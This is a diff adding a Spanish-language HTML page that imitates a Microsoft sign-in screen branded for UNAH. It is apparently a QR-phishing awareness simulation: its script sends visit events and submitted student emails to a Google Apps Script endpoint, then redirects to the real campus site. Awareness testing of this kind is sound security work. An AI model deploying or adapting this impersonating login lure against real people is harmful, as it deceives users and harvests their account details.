@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+  <title>Iniciar sesión en la cuenta</title>
+  <link rel="shortcut icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+  
+  <!-- Hoja de estilos oficial de Microsoft Login -->
+  <link crossorigin="anonymous" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_1l-glilo_-qew2-7tkjxlq2.css" rel="stylesheet">
+
+  <style>
+    body.cb {
+      display: block !important;
+      margin: 0;
+      padding: 0;
+      background-color: #f2f2f2;
+      font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+    }
+    .background-image-holder {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+    }
+    .background-image {
+      width: 100%;
+      height: 100%;
+      background-size: cover;
+      background-position: center center;
+      background-repeat: no-repeat;
+    }
+    .ext-boilerplate-text p {
+      margin: 0;
+      font-size: 13px;
+      line-height: 18px;
+    }
+    .mensaje-error {
+      color: #e81123;
+      font-size: 13px;
+      margin-bottom: 8px;
+      display: none;
+    }
+  </style>
+</head>
+
+<body class="cb">
+  <div>
+    <div class="login-paginated-page">
+      <div id="lightboxTemplateContainer" class="provide-min-height">
+        
+        <!-- Imagen de fondo de la UNAH -->
+        <div id="lightboxBackgroundContainer">
+          <div class="background-image-holder" role="presentation">
+            <div id="backgroundImage" role="img" class="background-image ext-background-image" aria-label="Imagen de fondo de la organización" style="background-image: url('https://aadcdn.msftauthimages.net/dbd5a2dd-jbm1vrx2upx1faf4nbwnviasibqmv56t0diun76bu04/logintenantbranding/0/illustration?ts=636298612516336218');"></div>
+            <div class="background-overlay ext-background-overlay"></div>
+          </div>
+        </div>
+
+        <div class="outer">
+          <div class="template-section main-section">
+            <div class="middle ext-middle">
+              <div class="full-height">
+                <div class="flex-column">
+                  <div class="win-scroll">
+                    
+                    <div id="vista-formulario">
+                      <form name="f1" id="form-quishing" novalidate="novalidate" spellcheck="false" autocomplete="off">
+                        <div id="lightbox" class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">
+                          <div class="lightbox-cover"></div>
+
+                          <!-- Logo UNAH -->
+                          <div>
+                            <img id="bannerLogo" src="https://aadcdn.msftauthimages.net/dbd5a2dd-jbm1vrx2upx1faf4nbwnviasibqmv56t0diun76bu04/logintenantbranding/0/bannerlogo?ts=636298612494570319" alt="Logotipo del banner de la organización" class="banner-logo ext-banner-logo">
+                          </div>
+
+                          <!-- Formulario -->
+                          <div role="main">
+                            <div>
+                              <div class="pagination-view animate slide-in-next">
+                                <div data-viewid="1">
+                                  <div>
+                                    <div class="row title ext-title" id="loginHeader">
+                                      <div role="heading" aria-level="1">Iniciar sesión</div>
+                                    </div>
+                                  </div>
+
+                                  <div id="error-correo" class="mensaje-error">
+                                    Escriba una dirección de correo electrónico, un número de teléfono o un nombre de Skype válidos.
+                                  </div>
+
+                                  <div class="row">
+                                    <div class="form-group col-md-24">
+                                      <div class="placeholderContainer">
+                                        <input type="email" name="loginfmt" id="input-correo" maxlength="113" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" autocomplete="username" aria-label="Escriba su correo electrónico, teléfono o Skype." placeholder="Correo electrónico, teléfono o Skype" required>
+                                      </div>
+                                    </div>
+                                  </div>
+
+                                  <div class="password-reset-links-container ext-password-reset-links-container">
+                                    <div class="row">
+                                      <div class="col-md-24">
+                                        <div class="text-13">
+                                          <div class="form-group">
+                                            <a id="cantAccessAccount" name="cannotAccessAccount" href="#">¿No puede acceder a su cuenta?</a>
+                                          </div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                  </div>
+
+                                  <div class="win-button-pin-bottom boilerplate-button-bottom">
+                                    <div class="row move-buttons">
+                                      <div>
+                                        <div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container">
+                                          <div class="inline-block button-item ext-button-item">
+                                            <input type="submit" id="btn-enviar" class="win-button button_primary high-contrast-overrides button ext-button primary ext-primary" value="Siguiente">
+                                          </div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                  </div>
+
+                                  <!-- Texto inferior de soporte UNAH -->
+                                  <div id="idBoilerPlateText" class="wrap-content boilerplate-text ext-boilerplate-text">
+                                    <p>Recuerda si tienes problemas con tu cuenta de correo, ingresa a https://mail.unah.edu.hn/RecursosApoyo o escribenos a soportecorreo@unah.hn.</p>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </form>
+
+                      <!-- Caja inferior: Opciones de inicio de sesión -->
+                      <div>
+                        <div class="promoted-fed-cred-content promoted-fed-cred-box ext-promoted-fed-cred-box">
+                          <div class="tile-container">
+                            <div class="row tile">
+                              <div class="table" role="button" tabindex="0" aria-label="Opciones de inicio de sesión">
+                                <div class="table-row">
+                                  <div class="table-cell tile-img medium">
+                                    <img class="tile-img medium" role="presentation" src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="">
+                                  </div>
+                                  <div class="table-cell text-left content">
+                                    <div data-test-id="signinOptions">Opciones de inicio de sesión</div>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Pie de página -->
+          <div id="footer" role="contentinfo" class="footer ext-footer background-always-visible">
+            <div>
+              <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links">
+                <a id="ftrTerms" href="https://www.microsoft.com/es-ES/servicesagreement/" target="_blank" class="footer-content ext-footer-content footer-item ext-footer-item has-background ext-has-background background-always-visible">Términos de uso</a>
+                <a id="ftrPrivacy" href="https://privacy.microsoft.com/es-ES/privacystatement" target="_blank" class="footer-content ext-footer-content footer-item ext-footer-item has-background ext-has-background background-always-visible">Privacidad y cookies</a>
+                <a id="moreOptions" href="#" role="button" aria-label="Haga clic aquí para obtener información relacionada con la solución de problemas." class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item has-background ext-has-background background-always-visible">...</a>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      // URL de tu backend de Google Apps Script
+      const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzufzO9VGVizZqIRtDiDErtifHhdlfCyf3wtk1cQjfaCMLFocVKAexc7eS0-X0gsZBhrg/exec";
+
+      const sessionId = "S-" + Math.floor(100000 + Math.random() * 900000);
+      let canalActual = "Lab_Primera_Planta";
+      let formularioYaIniciado = false;
+
+      // Leer parámetro ?canal= desde la URL
+      const params = new URLSearchParams(window.location.search);
+      const paramCanal = params.get("canal");
+      const canalesValidos = ["Lab_Primera_Planta", "Lab_Tercera_Planta", "Charla"];
+      if (paramCanal && canalesValidos.includes(paramCanal)) {
+        canalActual = paramCanal;
+      }
+
+      function enviarEvento(tipoEvento, correo) {
+        const payload = {
+          canal: canalActual,
+          tipo_evento: tipoEvento,
+          session_id: sessionId,
+          correo_estudiante: correo || ""
+        };
+
+        return fetch(APPS_SCRIPT_URL, {
+          method: "POST",
+          mode: "no-cors",
+          keepalive: true,
+          headers: {
+            "Content-Type": "text/plain;charset=utf-8"
+          },
+          body: JSON.stringify(payload)
+        }).catch(function (err) {
+          console.error("Error enviando evento:", err);
+        });
+      }
+
+      document.addEventListener("DOMContentLoaded", function () {
+        // 1. Registrar visita al abrir la página
+        enviarEvento("visita", "");
+
+        const form = document.getElementById("form-quishing");
+        const inputCorreo = document.getElementById("input-correo");
+        const errorCorreo = document.getElementById("error-correo");
+        const btnEnviar = document.getElementById("btn-enviar");
+
+        // 2. Registrar formulario_iniciado al empezar a escribir
+        inputCorreo.addEventListener("input", function () {
+          if (!formularioYaIniciado && inputCorreo.value.trim().length > 0) {
+            formularioYaIniciado = true;
+            enviarEvento("formulario_iniciado", "");
+          }
+        });
+
+        // 3. Registrar formulario_completado y redirigir
+        form.addEventListener("submit", function (e) {
+          e.preventDefault();
+          errorCorreo.style.display = "none";
+          inputCorreo.classList.remove("has-error");
+
+          const correo = inputCorreo.value.trim();
+          const regexCorreo = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+          if (!regexCorreo.test(correo)) {
+            errorCorreo.style.display = "block";
+            inputCorreo.classList.add("has-error");
+            return;
+          }
+
+          btnEnviar.disabled = true;
+
+          enviarEvento("formulario_completado", correo).finally(function () {
+            // Breve pausa de 400 ms para asegurar que Google Sheets reciba el registro antes de redirigir
+            setTimeout(function () {
+              window.location.href = "https://campusvirtualtrimestral.unah.edu.hn/";
+            }, 400);
+          });
+        });
+      });
+    })();
+  </script>
+</body>
+</html>
